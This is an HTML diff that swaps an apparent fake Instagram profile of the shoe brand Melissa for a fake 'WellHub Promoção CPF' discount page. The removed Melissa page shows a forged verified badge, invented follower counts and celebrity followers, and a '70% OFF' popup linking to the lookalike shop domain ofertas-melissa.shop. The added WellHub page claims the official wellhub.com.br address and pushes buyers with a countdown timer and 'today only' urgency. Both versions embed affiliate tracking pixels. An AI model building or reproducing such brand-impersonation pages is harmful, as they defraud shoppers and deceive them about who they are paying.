@@ -1,422 +1,1320 @@
-<html lang="pt-BR"><head>
-    <meta charset="utf-8">
-    <meta content="width=device-width, initial-scale=1.0" name="viewport">
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;600;700&amp;display=swap" rel="stylesheet">
-    <link href="css/all.min.css" rel="stylesheet">
-    <style>
-        body {
-            font-family: 'Roboto', sans-serif;
-            background-color: #fff;
-        }
-        #loading-screen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: white;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-        }
-        .verified-icon {
-            margin-left: 4px;
-            display: inline-flex;
-            align-items: center;
-        }
-        .verified-icon img {
-            width: 14px;
-            height: 14px;
-        }
-        .profile-image-container {
-            width: 84px;
-            height: 84px;
-            border-radius: 50%;
-            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
-            padding: 2px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        .profile-image {
-            width: calc(100% - 4px);
-            height: calc(100% - 4px);
-            object-fit: cover;
-            border-radius: 50%;
-            border: 2px solid white;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .loading-icon {
-            width: 20px;
-            height: 20px;
-            border: 2px solid rgba(255,255,255,0.3);
-            border-radius: 50%;
-            border-top: 2px solid #fff;
-            animation: spin 1s linear infinite;
-            display: none;
-        }
-        .fixed-header {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            background-color: white;
-            z-index: 1000;
-            height: 40px;
-            display: flex;
-            align-items: center;
-            padding: 0 10px;
-        }
-        .content-padding {
-            padding-top: 40px;
-        }
-        .custom-blue {
-            background-color: #1977F2;
-            color: white;
-        }
-        .custom-blue-text {
-            color: #1977F2;
-        }
-        .btn-text {
-            font-weight: 600;
-        }
-        .loading-spinner {
-            width: 20px;
-            height: 20px;
-            border: 2px solid #1977F2;
-            border-top: 2px solid transparent;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-        .nav-icon {
-            width: 24px;
-            height: 24px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        .search-icon {
-            font-size: 20px;
-        }
-        .plus-icon-container {
-            width: 24px;
-            height: 24px;
-            border: 2px solid black;
-            border-radius: 8px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        .plus-icon {
-            font-size: 20px;
-            font-weight: bold;
-        }
-        .image-with-line {
-            position: relative;
-        }
-        .image-with-line::before {
-            content: '';
-            position: absolute;
-            top: -3px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 60px;
-            height: 2.5px;
-            background-color: black;
-            margin-bottom: 3px;
-        }
-        #story-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 9999;
-            display: none;
-            overflow: hidden;
-        }
-        #story-content {
-            width: 100%;
-            height: 100%;
-            border: none;
-        }
-        .follower-image {
-            width: 24px;
-            height: 24px;
-            border-radius: 50%;
-            object-fit: cover;
-        }
-        .highlight-image {
-            width: 56px;
-            height: 56px;
-            border-radius: 50%;
-            object-fit: cover;
-        }
-        .highlight-container {
-            width: 64px;
-            height: 64px;
-            border-radius: 50%;
-            border: 2px solid #dbdbdb;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        #popup {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background-color: white;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            z-index: 10000;
-            max-width: 90%;
-            width: 300px;
-        }
-        .popup-header {
-            display: flex;
-            align-items: center;
-            margin-bottom: 10px;
-        }
-        .popup-header img {
-            width: 30px;
-            height: 30px;
-            border-radius: 50%;
-            margin-right: 10px;
-        }
-        .popup-header .verified-icon {
-            width: 12px;
-            height: 12px;
-            margin-left: 5px;
-        }
-        .popup-header .ad-label {
-            font-size: 12px;
-            color: #8e8e8e;
-            margin-left: 5px;
-        }
-    </style>
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>WellHub - Promoção CPF</title>
+  
+  <!-- Meta Tags para SEO -->
+  <meta name="description" content="Aproveite a promoção WellHub para CPF com até 70% de desconto em planos anuais e semestrais. Acesse mais de 50.000 academias e apps de saúde!">
+  
+  <!-- Open Graph para Redes Sociais -->
+  <meta property="og:title" content="WellHub - Promoção CPF">
+  <meta property="og:description" content="Aproveite a promoção WellHub para CPF com até 70% de desconto em planos anuais e semestrais. Acesse mais de 50.000 academias e apps de saúde!">
+  <meta property="og:image" content="images/og-image.png">
+  <meta property="og:url" content="https://www.wellhub.com.br/promo-cpf">
+  <meta property="og:type" content="website">
+  
+  <!-- Fonte Poppins com carregamento otimizado -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+  
+  <!-- CSS Melhorado com Variáveis -->
+  <style>
+    /* Variáveis CSS para Cores e Fontes */
+    :root {
+      --primary-color: #d73359;
+      --secondary-color: #ff4500;
+      --background-color: #fefbee;
+      --text-color: #333;
+      --light-text-color: #666;
+      --border-color: rgba(215, 51, 89, 0.5);
+      --font-family: 'Poppins', sans-serif;
+      --transition-speed: 0.3s;
+      --urgency-bg-color: #ffe6e6; /* Rosa Claro */
+      --urgency-text-color: #d73359;
+    }
+
+    /* Reset básico para garantir consistência entre navegadores */
+    *, *::before, *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    /* Estilo Geral */
+    body {
+      font-family: var(--font-family);
+      background-color: var(--background-color);
+      color: var(--text-color);
+      line-height: 1.6;
+      scroll-behavior: smooth;
+    }
+
+    a {
+      color: inherit;
+      text-decoration: none;
+      transition: color var(--transition-speed);
+    }
+
+    a:hover, a:focus {
+      color: var(--primary-color);
+    }
+
+    /* Cabeçalho */
+    header {
+      background-color: var(--background-color);
+      padding: 1rem 2rem;
+      border-bottom: 1px solid #e6e1c5;
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+    }
+
+    .container {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      max-width: 1200px;
+      margin: 0 auto;
+      flex-wrap: wrap;
+    }
+
+    /* Logo */
+    .logo {
+      height: 40px;
+      width: auto;
+    }
+
+    /* Seleção de Idioma */
+    .language {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .language img {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      object-fit: cover;
+      transition: transform var(--transition-speed);
+    }
+
+    .language img:hover, .language img:focus {
+      transform: scale(1.1);
+    }
+
+    /* Seção Hero */
+    .section-hero {
+      text-align: center;
+      padding: 5rem 2rem;
+      background-color: #fff;
+    }
+
+    .section-hero h1 {
+      font-size: 2.5rem;
+      color: var(--primary-color);
+      font-weight: 700;
+      margin-bottom: 1rem;
+    }
+
+    .section-hero p {
+      font-size: 1.25rem;
+      color: var(--text-color);
+      font-weight: 500;
+      margin-bottom: 2rem;
+    }
+
+    .btn-hero {
+      display: inline-block;
+      padding: 0.75rem 2rem;
+      background-color: var(--secondary-color);
+      color: #fff;
+      border: none; /* Removido border para botões */
+      border-radius: 50px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background-color var(--transition-speed), transform var(--transition-speed);
+    }
+
+    .btn-hero:hover, .btn-hero:focus {
+      background-color: #e03e00;
+      transform: translateY(-3px);
+    }
+
+    /* Contador */
+    .countdown {
+      font-size: 1.25rem;
+      color: var(--primary-color);
+      margin-top: 1rem;
+      font-weight: 700;
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.7; }
+    }
+
+    /* Seção Primeiros Passos */
+    .section-steps {
+      background-color: var(--primary-color);
+      color: #fff;
+      padding: 4rem 2rem;
+      text-align: center;
+    }
+
+    .section-steps h2 {
+      font-size: 1.5rem;
+      font-weight: 600;
+      margin-bottom: 0.5rem;
+      letter-spacing: 1px;
+    }
+
+    .section-steps h1 {
+      font-size: 2rem;
+      font-weight: 700;
+      margin-bottom: 1rem;
+    }
+
+    .section-steps p {
+      font-size: 1rem;
+      font-weight: 400;
+      margin-bottom: 2rem;
+    }
+
+    .step {
+      text-align: left;
+      margin-bottom: 1.5rem;
+      max-width: 600px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    .step h3 {
+      font-size: 1.25rem;
+      font-weight: 600;
+      margin-bottom: 0.5rem;
+    }
+
+    .step p {
+      font-size: 0.95rem;
+      margin-bottom: 0.5rem;
+      color: #f0f0f0;
+    }
+
+    .divider {
+      border-bottom: 1px solid rgba(255, 255, 255, 0.5);
+      margin: 1rem 0;
+    }
+
+    .btn-plan {
+      display: inline-block;
+      padding: 0.75rem 2rem;
+      background-color: #fff;
+      color: var(--primary-color);
+      border: none; /* Removido border */
+      border-radius: 50px;
+      font-weight: 600;
+      margin-top: 2rem;
+      transition: background-color var(--transition-speed), color var(--transition-speed), transform var(--transition-speed);
+      cursor: pointer; /* Adicionado cursor pointer */
+    }
+
+    .btn-plan:hover, .btn-plan:focus {
+      background-color: var(--primary-color);
+      color: #fff;
+      transform: translateY(-3px);
+    }
+
+    /* Seção Academias Parceiras */
+    .section-academias {
+      padding: 4rem 2rem;
+      background-color: var(--background-color);
+      text-align: center;
+    }
+
+    .section-academias h2 {
+      font-size: 2rem;
+      font-weight: 700;
+      margin-bottom: 1rem;
+      color: var(--text-color);
+    }
+
+    .section-academias p {
+      font-size: 1.125rem;
+      color: var(--light-text-color);
+      margin-bottom: 3rem;
+    }
+
+    /* Grid das Academias */
+    .academias-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+      gap: 2rem;
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+
+    .academia-card {
+      background-color: #fff;
+      padding: 1rem;
+      border-radius: 10px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      transition: transform var(--transition-speed), box-shadow var(--transition-speed);
+    }
+
+    .academia-card:hover, .academia-card:focus-within {
+      transform: translateY(-5px);
+      box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
+    }
+
+    .academia-card img {
+      width: 60px;
+      height: 60px;
+      margin-bottom: 1rem;
+      border-radius: 8px;
+      object-fit: cover;
+    }
+
+    .academia-card p {
+      font-size: 1rem;
+      font-weight: 500;
+      color: var(--text-color);
+    }
+
+    /* Categoria */
+    .categoria {
+      margin-top: 2rem;
+    }
+
+    .categoria-badge {
+      display: inline-block;
+      padding: 0.5rem 1rem;
+      font-size: 0.85rem;
+      font-weight: 600;
+      color: #388e3c;
+      background-color: #dff5e3;
+      border-radius: 20px;
+      text-transform: uppercase;
+      transition: background-color var(--transition-speed), color var(--transition-speed);
+    }
+
+    .categoria-badge:hover, .categoria-badge:focus {
+      background-color: #b7e5c1;
+      color: #2e7d32;
+    }
+
+    /* Seção Planos Populares */
+    .section-planos {
+      padding: 4rem 2rem;
+      background: linear-gradient(135deg, #ffd6e7, #fff1f5);
+      text-align: center;
+      position: relative;
+    }
+
+    .section-planos h2 {
+      font-size: 2rem;
+      font-weight: 700;
+      margin-bottom: 1rem;
+      color: var(--text-color);
+    }
+
+    .section-planos p {
+      font-size: 1rem;
+      color: var(--light-text-color);
+      margin-bottom: 3rem;
+    }
+
+    /* Marcador de Período */
+    .periodo-selector {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 2rem;
+      gap: 1rem;
+      flex-wrap: wrap;
+    }
+
+    .periodo-selector button {
+      padding: 0.75rem 2rem;
+      border: 2px solid var(--primary-color);
+      border-radius: 50px;
+      background: transparent;
+      color: var(--primary-color);
+      font-weight: 600;
+      cursor: pointer;
+      transition: background-color var(--transition-speed), color var(--transition-speed), box-shadow var(--transition-speed);
+      font-size: 1rem;
+    }
+
+    .periodo-selector button.active, .periodo-selector button:hover, .periodo-selector button:focus {
+      background: var(--primary-color);
+      color: #fff;
+      box-shadow: 0 4px 10px rgba(215, 51, 89, 0.5);
+      outline: none; /* Remove o outline padrão */
+    }
+
+    /* Tabela de Planos */
+    .planos-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+      gap: 2rem;
+      padding: 1rem;
+      max-width: 1200px;
+      margin: 0 auto;
+      transition: transform var(--transition-speed), opacity var(--transition-speed);
+    }
+
+    .plano-card {
+      background: #fff;
+      border-radius: 10px;
+      padding: 2rem;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      text-align: left;
+      border-top: 5px solid transparent;
+      transition: transform var(--transition-speed), box-shadow var(--transition-speed);
+      position: relative;
+    }
+
+    .plano-card:hover, .plano-card:focus-within {
+      transform: translateY(-10px);
+      box-shadow: 0 6px 15px rgba(0, 0, 0, 0.15);
+    }
+
+    /* Destaques dos Planos */
+    .plano-card.starter { border-color: #d73359; }
+    .plano-card.basic { border-color: #2e7d32; }
+    .plano-card.silver { border-color: #9c27b0; }
+    .plano-card.gold { border-color: #ff9800; }
+
+    /* Badge Recomendado */
+    .badge-recomendado {
+      position: absolute;
+      top: -10px;
+      right: -10px;
+      background-color: #388e3c;
+      color: #fff;
+      padding: 0.5rem 1rem;
+      border-radius: 50px;
+      font-size: 0.75rem;
+      font-weight: 600;
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+    }
+
+    /* Cabeçalhos dos Planos */
+    .plano-card h3 {
+      font-size: 1.75rem;
+      font-weight: 700;
+      color: var(--text-color);
+      margin-bottom: 0.5rem;
+    }
+
+    .plano-card p {
+      font-size: 1rem;
+      margin-bottom: 1rem;
+      color: var(--light-text-color);
+    }
+
+    /* Preços */
+    .plano-card .preco {
+      font-size: 1.75rem;
+      font-weight: 700;
+      color: var(--primary-color);
+      margin: 1rem 0;
+    }
+
+    /* Benefícios */
+    .plano-card ul {
+      list-style: none;
+      padding: 0;
+      margin-bottom: 1rem;
+    }
+
+    .plano-card ul li {
+      margin-bottom: 0.75rem;
+      font-size: 0.95rem;
+      color: var(--text-color);
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    /* Ícones dos Benefícios */
+    .plano-card ul li::before {
+      content: "✔️";
+      color: var(--primary-color);
+      font-size: 1rem;
+    }
+
+    /* Botão Assine Agora */
+    .btn-assine {
+      display: inline-block;
+      padding: 0.75rem 2rem;
+      background-color: var(--primary-color);
+      color: #fff;
+      border: none; /* Removido border */
+      border-radius: 50px;
+      font-weight: 600;
+      text-align: center;
+      text-decoration: none;
+      transition: background-color var(--transition-speed), box-shadow var(--transition-speed), transform var(--transition-speed);
+      width: 100%;
+      box-shadow: 0 4px 6px rgba(215, 51, 89, 0.3);
+      cursor: pointer; /* Adicionado cursor pointer */
+    }
+
+    .btn-assine:hover, .btn-assine:focus {
+      background-color: #b02548;
+      box-shadow: 0 6px 12px rgba(215, 51, 89, 0.5);
+      transform: translateY(-3px);
+      outline: none; /* Remove o outline padrão */
+    }
+
+    .plano-card .detalhe {
+      font-size: 0.85rem;
+      color: var(--light-text-color);
+      margin-top: 0.5rem;
+    }
+
+    /* FAQ */
+    .faq {
+      padding: 4rem 2rem;
+      background-color: #ffd6e7;
+      text-align: center;
+    }
+
+    .faq h2 {
+      font-size: 1.8rem;
+      margin-bottom: 2rem;
+      color: var(--text-color);
+    }
+
+    .faq details {
+      margin-bottom: 1rem;
+      padding: 1rem;
+      border: 1px solid var(--primary-color);
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background-color var(--transition-speed);
+    }
+
+    .faq details[open] {
+      background: #ffeaf1;
+    }
+
+    .faq details summary {
+      font-weight: 600;
+      font-size: 1rem;
+      color: var(--primary-color);
+      outline: none;
+      cursor: pointer; /* Adicionado cursor pointer */
+    }
+
+    .faq details p {
+      font-size: 0.9rem;
+      color: var(--light-text-color);
+      margin-top: 0.5rem;
+    }
+
+    /* Seção de Destaque */
+    .section-highlight {
+      padding: 4rem 2rem;
+      background-color: #fff;
+      text-align: center;
+    }
+
+    .section-highlight h2 {
+      font-size: 2rem;
+      font-weight: 700;
+      margin-bottom: 1rem;
+      color: var(--primary-color);
+    }
+
+    .highlight-list {
+      text-align: left;
+      display: inline-block;
+      max-width: 600px;
+      padding: 0;
+      list-style: none;
+    }
+
+    .highlight-list li::before {
+      content: "✔️ ";
+      color: var(--primary-color);
+      margin-right: 0.5rem;
+    }
+
+    .highlight-list li {
+      margin-bottom: 0.75rem;
+      font-size: 1rem;
+      font-weight: 500;
+      color: var(--text-color);
+    }
+
+    /* Novas Seções */
+    
+    /* Seção "Você vai amar nossa rede" */
+    .section-amar-rede {
+      padding: 4rem 2rem;
+      background-color: #fff;
+      text-align: center;
+    }
+
+    .section-amar-rede h2 {
+      font-size: 2rem;
+      font-weight: 700;
+      margin-bottom: 1rem;
+      color: var(--text-color);
+    }
+
+    .stats {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 2rem;
+      margin-bottom: 3rem;
+    }
+
+    .stat {
+      font-size: 1.2rem;
+      font-weight: 600;
+      color: var(--text-color);
+    }
+
+    .comentarios {
+      max-width: 800px;
+      margin: 0 auto;
+      text-align: left;
+    }
+
+    .comentario {
+      background-color: #f9f9f9;
+      padding: 1.5rem;
+      border-radius: 10px;
+      margin-bottom: 1.5rem;
+      position: relative;
+    }
+
+    .comentario::before {
+      content: "★★★★★";
+      color: #FFD700; /* Cor dourada para as estrelas */
+      position: absolute;
+      top: 1rem;
+      right: 1rem;
+      font-size: 1rem;
+    }
+
+    .comentario p {
+      font-size: 1rem;
+      color: var(--text-color);
+      margin-top: 0.5rem;
+    }
+
+    .comentario .nome {
+      font-weight: 600;
+      color: var(--primary-color);
+    }
+
+    /* Elementos de Escassez e Urgência */
+    .section-urgencia {
+      padding: 3rem 2rem;
+      background-color: var(--urgency-bg-color);
+      text-align: center;
+      color: var(--urgency-text-color);
+    }
+
+    .section-urgencia h2 {
+      font-size: 1.5rem;
+      font-weight: 700;
+      margin-bottom: 1rem;
+    }
+
+    .section-urgencia p {
+      font-size: 1.1rem;
+      font-weight: 500;
+      margin-bottom: 0.5rem;
+    }
+
+    /* Seção "Tudo isso está esperando por você!" */
+    .section-funcionalidades {
+      padding: 4rem 2rem;
+      background-color: #fff;
+      text-align: center;
+    }
+
+    .section-funcionalidades h2 {
+      font-size: 2rem;
+      font-weight: 700;
+      margin-bottom: 2rem;
+      color: var(--text-color);
+    }
+
+    .funcionalidades-grid {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 2rem;
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+
+    .funcionalidade {
+      flex: 1 1 200px;
+      max-width: 250px;
+      text-align: center;
+    }
+
+    .funcionalidade img {
+      width: 60px;
+      height: 60px;
+      margin-bottom: 1rem;
+      object-fit: contain; /* Ajuste para melhor exibição */
+    }
+
+    .funcionalidade p {
+      font-size: 1rem;
+      color: var(--text-color);
+      font-weight: 500;
+    }
+
+    /* Rodapé */
+    footer {
+      background-color: #f5f5f5;
+      padding: 2rem;
+      text-align: center;
+      color: var(--text-color);
+    }
+
+    footer .urgencia-footer {
+      background-color: var(--urgency-bg-color);
+      color: var(--urgency-text-color);
+      padding: 2rem;
+      margin: 2rem 0;
+      border-radius: 10px;
+    }
+
+    footer .urgencia-footer p {
+      font-size: 1.2rem;
+      font-weight: 600;
+    }
+
+    /* Responsividade */
+    @media (max-width: 768px) {
+      .logo {
+        height: 32px;
+      }
+
+      .language img {
+        width: 20px;
+        height: 20px;
+      }
+
+      .section-hero h1 {
+        font-size: 2rem;
+      }
+
+      .section-steps h1 {
+        font-size: 1.75rem;
+      }
+
+      .section-academias h2 {
+        font-size: 1.75rem;
+      }
+
+      .section-planos h2 {
+        font-size: 1.75rem;
+      }
+
+      .highlight-list li {
+        font-size: 0.95rem;
+      }
+
+      /* Carrossel para Planos */
+      .planos-grid {
+        display: flex;
+        overflow-x: scroll;
+        scroll-snap-type: x mandatory;
+        -webkit-overflow-scrolling: touch;
+      }
+
+      .plano-card {
+        min-width: 80%;
+        scroll-snap-align: start;
+        margin-right: 1rem;
+      }
+
+      /* Oculta a barra de rolagem */
+      .planos-grid::-webkit-scrollbar {
+        display: none;
+      }
+
+      .planos-grid {
+        -ms-overflow-style: none;  /* IE and Edge */
+        scrollbar-width: none;  /* Firefox */
+      }
+
+      /* Botões de Navegação */
+      .carousel-nav {
+        position: absolute;
+        top: 50%;
+        transform: translateY(-50%);
+        width: 100%;
+        display: flex;
+        justify-content: space-between;
+        pointer-events: none;
+      }
+
+      .carousel-nav button {
+        background-color: rgba(0, 0, 0, 0.5);
+        border: none;
+        color: #fff;
+        padding: 0.5rem;
+        border-radius: 50%;
+        cursor: pointer;
+        pointer-events: all;
+        transition: background-color var(--transition-speed);
+      }
+
+      .carousel-nav button:hover {
+        background-color: rgba(0, 0, 0, 0.7);
+      }
+    }
+
+    @media (max-width: 480px) {
+      .section-hero {
+        padding: 2rem 1rem;
+      }
+
+      .section-steps {
+        padding: 2rem 1rem;
+      }
+
+      .section-academias {
+        padding: 2rem 1rem;
+      }
+
+      .section-planos {
+        padding: 2rem 1rem;
+      }
+
+      .btn-hero, .btn-plan, .btn-assine {
+        width: 100%;
+        padding: 0.75rem;
+        box-sizing: border-box;
+      }
+
+      .academias-grid {
+        grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
+        gap: 1rem;
+      }
+
+      .funcionalidades-grid {
+        flex-direction: column;
+        align-items: center;
+      }
+    }
+  </style>
 
 <script>
-    window.pixelId = "672c2e3200f8bfc2bafde713";
-    var a = document.createElement("script");
-    a.setAttribute("async", "");
-    a.setAttribute("defer", "");
-    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-    document.head.appendChild(a);
-  </script><script async="" defer="" src="js/pixel.js"></script><script async="" defer="" src="js/pixel_1.js"></script>
+  window.pixelId = "678eb1306a1b268d4dbff2b3";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
 
 <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
 
 </head>
-<body class="bg-white">
-    <div id="loading-screen">
-        <img src="images/instagram-logo-instagram-icon-transparent-free-png.png" alt="Instagram Logo" class="w-48 h-48">
-    </div>
 
-    <div id="popup">
-        <div class="popup-header">
-            <img src="images/logo.png" alt="Uber logo">
-            <span class="font-bold">melissaoficial</span>
-            <img src="https://img.icons8.com/?size=512&amp;id=2sZ0sdlG9kWP&amp;format=png" alt="Verified icon" class="verified-icon">
-            <span class="ad-label">Publicidade</span>
+<body>
+  <!-- Cabeçalho -->
+  <header>
+    <div class="container">
+      <a href="/" aria-label="Página Inicial">
+        <img src="images/wellhub-logo.png" alt="Logo da WellHub" class="logo" loading="lazy">
+      </a>
+      <nav aria-label="Seleção de Idioma">
+        <div class="language">
+          <a href="#" aria-label="Idioma Português">
+            <img src="images/3909370.png" alt="Bandeira do Brasil" loading="lazy">
+          </a>
+          <!-- Adicione mais opções de idioma aqui, se necessário -->
         </div>
-        <p class="mb-4">Lançamento de peças com 70% OFF.</p>
-		            <p class="text-sm text-gray-600">Aproveite nossa promoção especial de lançamento e renove sua coleção de produtos melissa com descontos incríveis!</p>
-
-        <a href="https://ofertas-melissa.shop/collections/black-november-70-off" class="bg-blue-500 text-white px-4 py-2 rounded block text-center">Ir para o site</a>
+      </nav>
     </div>
+  </header>
 
-    <div id="content" class="max-w-md mx-auto bg-white min-h-screen hidden">
-        <header class="fixed-header flex items-center justify-between bg-white">
-            <i class="fas fa-arrow-left text-black text-lg"></i>
-            <h1 class="text-black text-base font-semibold flex items-center">
-                melissaoficial
-                <span class="verified-icon">
-                    <img src="https://img.icons8.com/?size=512&amp;id=2sZ0sdlG9kWP&amp;format=png" alt="Verified icon">
-                </span>
-            </h1>
-            <i class="fas fa-ellipsis-h text-black text-lg"></i>
-        </header>
+  <!-- Hero -->
+  <main>
+    <section class="section-hero" id="hero">
+      <p>GYMPASS AGORA É WELLHUB</p>
+      <h1>Primeiros Meses do Ano: WellHub Liberado para CPF!</h1>
+      <p>Exclusivo para planos mensal e semestrais. Não perca!</p>
+      <button class="btn-hero" aria-label="Garanta seu Gympass CPF Agora" onclick="document.getElementById('planos').scrollIntoView({ behavior: 'smooth' });">
+        Garanta seu Gympass CPF Agora!
+      </button>
+      <p class="countdown" aria-live="polite">Promoção termina em <span id="countdown-timer"></span></p>
+    </section>
 
-        <div class="content-padding">
-            <div class="px-4 mt-8">
-                <div class="flex items-center">
-                    <div id="profileImageContainer" class="profile-image-container">
-                        <img id="profileImage" alt="Correios logo with yellow and blue arrows on a green background" class="profile-image" src="images/logo.png">
-                    </div>
-                    <div class="flex-1 ml-8">
-                        <div class="flex justify-between text-center">
-                            <div>
-                                <div class="font-bold">7.360</div>
-                                <div class="text-xs">publicações</div>
-                            </div>
-                            <div>
-                                <div class="font-bold">4.6 M</div>
-                                <div class="text-xs">seguidores</div>
-                            </div>
-                            <div>
-                                <div class="font-bold">1674</div>
-                                <div class="text-xs">seguindo</div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-                <div class="mt-4">
-                    <h2 class="font-bold">Melissa Brasil &amp; Co.</h2>
-                    <p class="text-sm">Melissa | <font color="#1977F2">@mrichaoficial</font> | <font color="#1977F2"><font color="#1977F2">@shopgrig</font> | <font color="#1977F2">@melissaoficial</font> | <font color="#1977F2">@bubkaoficial</font> l <font color="#1977F2">@melissaoficial</font>
-</font></p><font color="#1977F2">
-                    <p class="text-sm custom-blue-text" style="color: #000000;">Visite nosso site:</p>
-</font>
-              <a class="custom-blue-text text-sm" href="melissaoficial/">www.melissa.com.br</a>
- 
-                </div>
+    <!-- Seção Primeiros Passos -->
+    <section class="section-steps">
+      <h2>Por que aproveitar agora?</h2>
+      <h1>Primeira vez disponível para CPF.</h1>
+      <p>Acesso a 50.000 academias e apps de saúde.</p>
+      
+      <div class="step">
+        <h3>50% de desconto em planos semestrais.</h3>
+        <p>Confirme seus dados e crie uma conta.</p>
+      </div>
+      <div class="divider" aria-hidden="true"></div>
+      
+      <div class="step">
+        <h3>Promoção válida até hoje.</h3>
+        <p>Escolha um plano com as opções de bem-estar que você deseja.</p>
+      </div>
+      <div class="divider" aria-hidden="true"></div>
+      
+      <div class="step">
+        <h3>Aproveite o WellHub</h3>
+        <p>Reserve aulas, aproveite recursos de autocuidado e muito mais!</p>
+      </div>
+      
+      <button class="btn-plan" aria-label="Encontre seu plano" onclick="document.getElementById('planos').scrollIntoView({ behavior: 'smooth' });">
+        Encontre seu plano →
+      </button>
+    </section>
 
-				                <div class="mt-2 flex items-center">
-                    <img alt="Small profile pictures of followers" class="w-8 h-8 rounded-full" height="30" src="images/4456129.jpg" width="30">
-                    <p class="text-sm ml-2">Seguido(a) por <strong>anitta, brunamarquezine</strong> e <strong>outras 24 pessoas</strong></p>
-                </div>
-                <div class="flex mt-4 space-x-2">
-                    <button id="followButton" class="flex-1 custom-blue py-1.5 rounded flex items-center justify-center">
-                        <span id="buttonText" class="btn-text">Seguir</span>
-                        <div class="loading-icon ml-2"></div>
-                        <svg id="downArrow" class="ml-1 hidden" aria-label="Ícone de seta para baixo" fill="currentColor" height="12" role="img" viewBox="0 0 24 24" width="12">
-                            <title>Ícone de seta para baixo</title>
-                            <path d="M12 16.502l-7.293-7.296a1 1 0 1 1 1.414-1.414L12 13.67l5.879-5.878a1 1 0 1 1 1.414 1.414L12 16.502z"></path>
-                        </svg>
-                    </button>
-                    <button id="messageButton" class="flex-1 text-black py-1.5 rounded" style="background-color: #F3F4F6;">
-                        <span class="btn-text">Mensagem</span>
-                    </button>
-                    <button class="px-2 py-1.5 rounded" style="background-color: #F3F4F6;">
-                        <i class="fas fa-user-plus btn-text"></i>
-                    </button>
-                </div>
-            </div>
-            <div class="flex p-4 space-x-4 overflow-x-auto">
-                <div class="flex flex-col items-center">
-                    <div class="highlight-container">
-                        <img alt="Warning sign for alert" class="highlight-image" src="images/destaque1.jpg">
-                    </div>
-                    <span class="text-xs mt-1">Quem usa</span>
-                </div>
-                <div class="flex flex-col items-center">
-                    <div id="ajudeRSContainer" class="highlight-container">
-                        <img id="ajudeRSImage" alt="Help Rio Grande do Sul campaign" class="highlight-image" src="images/destaque2.jpg">
-                    </div>
-                    <span class="text-xs mt-1">ZZ&amp;Co.</span>
-                </div>
-            </div>
-            <div class="flex justify-around pt-2 mb-2">
-                <img src="images/IMG-7309.jpg" alt="Grid icon" class="w-6 h-6 object-cover">
-                <img src="images/IMG-7305.jpg" alt="Reels icon" class="w-6 h-6 object-cover">
-                <img src="images/IMG-7306.jpg" alt="User icon" class="w-6 h-6 object-cover">
-            </div>
-            <div class="grid grid-cols-3 gap-1 mt-1">
-                <div class="image-with-line">
-                    <img alt="Correios delivery truck on the road" class="w-full aspect-square object-cover" src="images/post1.png">
-                </div>
-                <img alt="Correios employee delivering a package" class="w-full aspect-square object-cover" src="images/post2.png">
-                <img alt="Correios logo on a building" class="w-full aspect-square object-cover" src="images/post3.png">
-                <img alt="Correios employee sorting packages" class="w-full aspect-square object-cover" src="images/post4.png">
